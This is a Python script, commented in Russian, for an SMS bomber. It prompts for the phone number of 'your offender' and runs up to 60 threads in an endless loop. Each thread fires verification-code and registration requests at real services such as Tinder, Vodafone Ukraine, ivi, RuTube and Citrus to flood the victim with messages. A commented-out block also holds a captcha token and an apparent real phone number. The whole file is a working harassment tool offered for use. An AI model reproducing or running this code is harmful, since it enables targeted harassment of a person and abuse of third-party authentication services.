import requests, random, datetime, sys, time, argparse, os
import threading
import json
from colorama import init
from termcolor import colored

init()# Иницеалезирую цвет(делаю так что б все print были разноцветными)

#-_-_-_-_-_-_-_-_-_-_-_-_Подготовка Номера и всех переменных -_-_-_-_-_-_-_-_-_-_-_-_

print(colored("Введите название страны(РУС, УКР)", "yellow"))
while True:
	country = str(input("-----> "))
	country = country.lower()
	if country == "укр" or country == "рус":
		break
	if country != "укр" or country != "рус":
		print(colored("Я вроде ясно выразелся, тут только либо РУС, либо УКР", "red"))

print(colored("А теперь номер вашего обидчика (пример: 7хххххххххх или 38хххххххххх)", "yellow"))
while True:
	try:
		phone = int(input("-----> "))
		if country == "укр" and len(str(phone)) == 12:
			_phone = str(phone)[2:]
			phonebuzzolls = f"+38 ({_phone[0:3]}) {_phone[3:6]}-{_phone[6:8]}-{_phone[8:10]}"
			phonedianet = f"+38 ({_phone[0:3]}) {_phone[3:6]} {_phone[6:8]} {_phone[8:10]}"
			phoneiQlab = f"+38 ({_phone[0:3]}) {_phone[3:6]} {_phone[6:8]} {_phone[8:10]}"
			phoneCitrus = f"+380 {_phone[1:3]} {_phone[3:6]} {_phone[6:8]} {_phone[8:10]}"
			phonevodafone = _phone[1:]
			print(colored(phoneCitrus, "green"))
			break
		elif country == "рус" and len(str(phone)) == 11:
			_phone = str(phone)[1:]
			phonebuzzolls = f"+7 ({_phone[0:3]}) {_phone[3:5]}-{_phone[6:7]}-{_phone[8:9]}"
			print(colored(phonebuzzolls, "green"))
			print(colored(phone, "green"))
			break
		elif country == "укр" and len(str(phone)) != 12:
			print(colored("В номере ошибка", "red"))
		elif country == "рус" and len(str(phone)) != 11:
			print(colored("В номере ошибка", "red"))
	except:
		print(colored("В номере ошибка", "red"))

print(colored("Во сколько потоков атаковать(max. 60):", "yellow"))
while True:
	try:
		th = int(input("-----> "))
		break
	except:
		print(colored("В кол-во потоках ошибка", "red"))
phone = str(phone)
_phone = str(_phone)
password = ['1gjfgj56', '96fg8072533', '5367493sdg', '232lkgshlg', '6jl09225', '823iom5']
email = 'email_man_today@mail.ru'

#-_-_-_-_-_-_-_-_-_-_-_-_Основная функция где происходит вся магия(шлет спам)-_-_-_-_-_-_-_-_-_-_-_-_

def loop(password, sleep_time, k, th):
	sleep_time = float(sleep_time)
	password = random.choice(password)
	try:
		buzzolls = requests.get(
				"https://it.buzzolls.ru:9995/api/v2/auth/register",
				params={"phoneNumber": "+"+phone},
				headers={"keywordapi": "ProjectVApiKeyword", "usedapiversion": "3"}
			)
		if str(buzzolls) == "<Response [200]>":
			print(colored("[+] Buzzolls отправленно", "green"))
		else:
			print(colored("[-] Buzzolls НЕотправленно", "red"))
	except:
		print(colored("[-] Ошибка", "red"))
	time.sleep(sleep_time)
	try:
		alfalife = requests.post(
				"https://alfalife.cc/auth.php", 
				data={"phone": _phone},
				headers={"User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0"}
			)
		if str(alfalife) == "<Response [200]>" and not "error" in str(alfalife.content):
			print(colored("[+] Alfalife отправленно", "green"))
		else:
			print(colored("[-] Alfalife НЕотправленно", "red"))
	except:
		print(colored("[-] Ошибка", "red"))
	time.sleep(sleep_time)
	try:
		beltelecom = requests.post(
			'https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', 
			data={'phone': phone})
		if str(beltelecom) == "<Response [200]>" and not "error" in str(beltelecom.content):
			print(colored("[+] Beltelecom отправленно", "green"))
		else:
			print(colored("[-] Beltelecom НЕотправленно", "red"))
	except:
		print(colored("[-] Ошибка", "red"))
	time.sleep(sleep_time)
	try:
		vodafone = requests.post(
			'https://cscapp.vodafone.ua/eai_mob/start.swe?SWEExtSource=JSONConverter&SWEExtCmd=Execute', 
			json={
				"params":
					{"version":"1.8.0",
					"language":"ru",
					"source":"WebApp",
					"token":"null",
					"manufacture":"",
					"childNumber":"",
					"accessType":"",
					"spinner":1},
				"requests":
					{"loginV2":
						{"id":phonevodafone}
					}
				}, 
			headers={
				"Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7,uk;q=0.6",
				"Connection": "keep-alive",
				"Host": "cscapp.vodafone.ua",
				"Origin": "https://my.vodafone.ua",
				"Referer": "https://my.vodafone.ua/auth/sign-in",
			})
		if str(vodafone) == "<Response [200]>" and not "error" in str(vodafone.content):
			print(colored("[+] Vodafone отправленно", "green"))
		else:
			print(colored("[-] Vodafone НЕотправленно", "red"))
	except:
		print(colored("[-] Ошибка", "red"))
	time.sleep(sleep_time)
	try:
		tinder = requests.post(
			'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
			data={'phone_number': phone})
		if str(tinder) == "<Response [200]>" and not "error" in str(tinder.content):
			print(colored('[+] Tinder отправлено', 'green'))
		else:
			print(colored("[-] Tinder НЕотправленно", "red"))
	except:
		print(colored("[-] Ошибка", "red"))
	time.sleep(sleep_time)
	try:
		ivi = requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": '+' + phone})
		if str(ivi) == "<Response [200]>" and not "error" in str(ivi.content):
			print(colored('[+] IvI отправлено', 'green'))
		else:
			print(colored("[-] IvI НЕотправленно", "red"))
	except:
		print(colored("[-] Ошибка", "red"))
	time.sleep(sleep_time)
	try:
		helsi = requests.post(
			"https://helsi.me/api/healthy/accounts/login",
			json={"phone": phone, "platform": "PISWeb"},
		)
		if str(helsi) == "<Response [202]>" or str(helsi) == "<Response [200]>":
			print(colored('[+] Helsi отправлено', 'green'))
		else:
			print(colored("[-] Helsi НЕотправленно", "red"))
	except:
		print(colored("[-] Ошибка", "red"))
	time.sleep(sleep_time)
	try:
		rutube = requests.post(
			'https://pass.rutube.ru/api/accounts/phone/send-code/',
			data={
				"phone": "+" + phone, 
				"g-recaptcha-response": ""
			},
			headers = {
				'Accept-Language':'uk-UA,uk;q=0.9,en-US;q=0.8,en;q=0.7',
				'Connection':'keep-alive',
				'Host':'pass.rutube.ru',
				'origin':'https://rutube.ru',
				'Referer':'https://rutube.ru/'
			})
		if str(rutube) == "<Response [200]>":
			print(colored('[+] RuTube отправлено', 'green'))
		else:
			print(colored("[-] RuTube НЕотправленно", "red"))
	except:
		print(colored("[-] Ошибка", "red"))
	time.sleep(sleep_time)
	try:
		citrus = requests.post(
			f"https://my.citrus.ua/api/auth/login",
			data={"identity": phoneCitrus},
			)
		if str(citrus) == "<Response [200]>":
			print(colored('[+] Сitrus отправлено', 'green'))
		else:
			print(colored("[-] Сitrus НЕотправленно", "red"))
	except:
		print(colored("[-] Ошибка", "red"))
	time.sleep(sleep_time)
	# try:
	# 	foxtrot = requests.post(
	# 		f"https://www.foxtrot.com.ua/ru/account/newlogin",
	# 		data={
	# 		"__RequestVerificationToken": "wxTmOGaBiVaDwWuGFSYUEegTerhb3fS_c7c4eJB5z1odfkPMfnQNizC9LWw-voPqx5AE4RDIO-ChQzqsCqacgfDVstc1",
	# 		"GoogleCaptchaToken": "03AGdBq26Z-i7BWDR5Uair2718qg5SIic6SwTTNxV4NCLfHTA93ql_iaX3JBvFb1j16-NccoItITov3kPYfsDuG5RDW5pPWbqSqIOuxlE17_sHyo4UlLrjyQw1QxXb-JopWhzWuwwQbDdopqS8C6eOxLRg_GjIjXFju5SC9GaG_fXPz-mP_tizke2BObB6kE0jsloc4PMw9Zb8r5ReOwnp8TSpiSYWt5i7DU1j2150MQYRZrE7AybDI6vGYeUeb8XYTyMQ3vpgAA2MUt87TmUO1zhBP2uzXYzV1ajnhUq1slNMhbUXIFTxKGAArUpWhw1IOdoGa_eNhqVNOXdogvNsHu8YT0K2dphcgg2cYKX1tMGB2iSEyf0h8ZaEBXbrW2knN1yivjZlU8Ya",
	# 		"CellPhone": "+38(099) 972 37 55",
	# 		"X-Requested-With": "XMLHttpRequest"},
	# 		headers={
	# 			"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
	# 		})
	# 	print(mamamia.text)
	# 	if str(mamamia) == "<Response [200]>":
	# 		print(colored('[+] FoxTrot отправлено', 'green'))
	# 	else:
	# 		print(colored("[-] FoxTrot НЕотправленно", "red"))
	# except:
	# 	print(colored("[-] Ошибка", "red"))
	# time.sleep(sleep_time)

	if th > 60:
		print(colored(f"{k}/60 круг пройден", "yellow"))
	else:
		print(colored(f"{k}/{th} круг пройден", "yellow"))


#-_-_-_-_-_-_-_-_-_-_-_-_Поток всех запросов(зауск функции)-_-_-_-_-_-_-_-_-_-_-_-_

#Потоки
k = 1
_sleep = "0"
while True:
	if th >= 1:
		t1 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t1.start()
		_threat = t1
	if th >= 2:
		t2 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t2.start()
		_threat = t2
	if th >= 3:
		t3 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t3.start()
		_threat = t3
	if th >= 4:
		t4 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t4.start()
		_threat = t4
	if th >= 5:
		t5 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t5.start()
		_threat = t5
	if th >= 6:
		t6 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t6.start()
		_threat = t6
	if th >= 7:
		t7 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t7.start()
		_threat = t7
	if th >= 8:
		t8 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t8.start()
		_threat = t8
	if th >= 9:
		t9 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t9.start()
		_threat = t9
	if th >= 11:
		t11 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t11.start()
		_threat = t11
	if th >= 12:
		t12 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t12.start()
		_threat = t12
	if th >= 13:
		t13 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t13.start()
		_threat = t13
	if th >= 14:
		t14 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t14.start()
		_threat = t14
	if th >= 15:
		t15 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t15.start()
		_threat = t15
	if th >= 16:
		t16 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t16.start()
		_threat = t16
	if th >= 17:
		t17 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t17.start()
		_threat = t17
	if th >= 18:
		t18 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t18.start()
		_threat = t18
	if th >= 19:
		t19 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t19.start()
		_threat = t19
	if th >= 20:
		t20 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t20.start()
		_threat = t20
	if th >= 21:
		t21 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t21.start()
		_threat = t21
	if th >= 22:
		t22 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t22.start()
		_threat = t22
	if th >= 23:
		t23 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t23.start()
		_threat = t23
	if th >= 24:
		t24 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t24.start()
		_threat = t24
	if th >= 25:
		t25 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t25.start()
		_threat = t25
	if th >= 26:
		t26 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t26.start()
		_threat = t26
	if th >= 27:
		t27 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t27.start()
		_threat = t27
	if th >= 28:
		t28 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t28.start()
		_threat = t28
	if th >= 29:
		t29 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t29.start()
		_threat = t29
	if th >= 30:
		t30 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t30.start()
		_threat = t30
	if th >= 31:
		t31 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t31.start()
		_threat = t31
	if th >= 32:
		t32 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t32.start()
		_threat = t32
	if th >= 33:
		t33 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t33.start()
		_threat = t33
	if th >= 34:
		t34 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t34.start()
		_threat = t34
	if th >= 35:
		t35 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t35.start()
		_threat = t35
	if th >= 36:
		t36 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t36.start()
		_threat = t36
	if th >= 37:
		t37 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t37.start()
		_threat = t37
	if th >= 38:
		t38 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t38.start()
		_threat = t38
	if th >= 39:
		t39 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t39.start()
		_threat = t39
	if th >= 40:
		t40 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t40.start()
		_threat = t40
	if th >= 41:
		t41 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t41.start()
		_threat = t41
	if th >= 42:
		t42 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t42.start()
		_threat = t42
	if th >= 43:
		t43 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t43.start()
		_threat = t43
	if th >= 44:
		t44 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t44.start()
		_threat = t44
	if th >= 45:
		t45 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t45.start()
		_threat = t45
	if th >= 46:
		t46 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t46.start()
		_threat = t46
	if th >= 47:
		t47 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t47.start()
		_threat = t47
	if th >= 48:
		t48 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t48.start()
		_threat = t48
	if th >= 49:
		t49 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t49.start()
		_threat = t49
	if th >= 50:
		t50 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t50.start()
		_threat = t50
	if th >= 51:
		t51 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t51.start()
		_threat = t51
	if th >= 52:
		t52 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t52.start()
		_threat = t52
	if th >= 53:
		t53 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t53.start()
		_threat = t53
	if th >= 54:
		t54 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t54.start()
		_threat = t54
	if th >= 55:
		t55 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t55.start()
		_threat = t55
	if th >= 56:
		t56 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t56.start()
		_threat = t56
	if th >= 57:
		t57 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t57.start()
		_threat = t57
	_threat.join()
	if th >= 58:
		t58 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t58.start()
		_threat = t58
	_threat.join()
	if th >= 59:
		t59 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t59.start()
		_threat = t59
	_threat.join()
	if th >= 60:
		t60 = threading.Thread(target=loop, args=(password, _sleep, k, th))
		t60.start()
		_threat = t60
	_threat.join()

	# if th == k:
	# 	print(colored("Всё готово, ждем реакции ^-^", 'yellow'))
	# 	time.sleep(5)
	# 	exit()
	k += 1
